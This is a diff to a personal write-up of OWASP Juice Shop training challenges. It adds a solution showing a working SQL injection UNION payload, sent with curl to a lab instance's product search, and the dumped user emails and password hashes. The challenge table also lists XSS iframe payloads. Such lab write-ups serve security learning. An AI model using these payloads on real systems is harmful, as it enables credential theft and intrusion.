@@ -21,10 +21,52 @@
 | Reset Bender's Password | Reset Bender's password via the Forgot Password mechanism with the original answer to his security question. | :heavy_minus_sign:
 | Steganography Tier 1 | Rat out a notorious character hiding in plain sight in the shop. (Mention the exact name of the character) | :heavy_minus_sign:
 | Typosquatting Tier 1 | Inform the shop about a typosquatting trick it has become victim of. (Mention the exact name of the culprit) | :heavy_minus_sign:
-| User Credentials | Retrieve a list of all user credentials via SQL Injection | :heavy_minus_sign:
+| [User Credentials](#user-credentials) | Retrieve a list of all user credentials via SQL Injection | :heavy_minus_sign:
 | Vulnerable Library | Inform the shop about a vulnerable library it is using. (Mention the exact library name and version in your comment) | :heavy_minus_sign:
 | XSS Tier 4 | Perform a persisted XSS attack with `<iframe src="javascript:alert('xss')">` bypassing a server-side security mechanism. | :heavy_minus_sign:
 | XSS Tier 5 | Perform a persisted XSS attack with `<iframe src="javascript:alert('xss')">` through an HTTP header. | :heavy_minus_sign:
 
 ## Solutions
-None attempted yet! Still working on lower levels.
+
+### User Credentials
+
+> Retrieve a list of all user credentials via SQL Injection
+
+* Solved? :white_check_mark:
+* Tools Used: Chrome
+
+This one I stumbled upon by accident. I basically was looking at different endpoints, and attempting SQL injection for another challenge. My curl command looked like so, and the next time I visited the site in Chrome, I saw a nice green banner.
+
+```bash
+curl "http://172.16.189.131:3000/rest/products/search?q=Forensic'%20or%201=2))%20UNION%20ALL%20SELECT%20id,email%20as%20name,password%20as%20description,1%20as%20price,null,null,null,null%20from%20users--" -s | jq
+{
+  "status": "success",
+  "data": [
+    {
+      "id": 1,
+      "name": "admin@juice-sh.op",
+      "description": "0192023a7bbd73250516f069df18b500",
+      "price": 1,
+      "image": null,
+      "createdAt": null,
+      "updatedAt": null,
+      "deletedAt": null
+    },
+    {
+      "id": 2,
+      "name": "jim@juice-sh.op",
+      "description": "e541ca7ecf72b8d1286474fc613e5e45",
+      "price": 1,
+      "image": null,
+      "createdAt": null,
+      "updatedAt": null,
+      "deletedAt": null
+    }, 
+    /* etc */
+  ]
+}
+```
+
+<img src="images/4-users-sql-injection-solved.png">
+
+
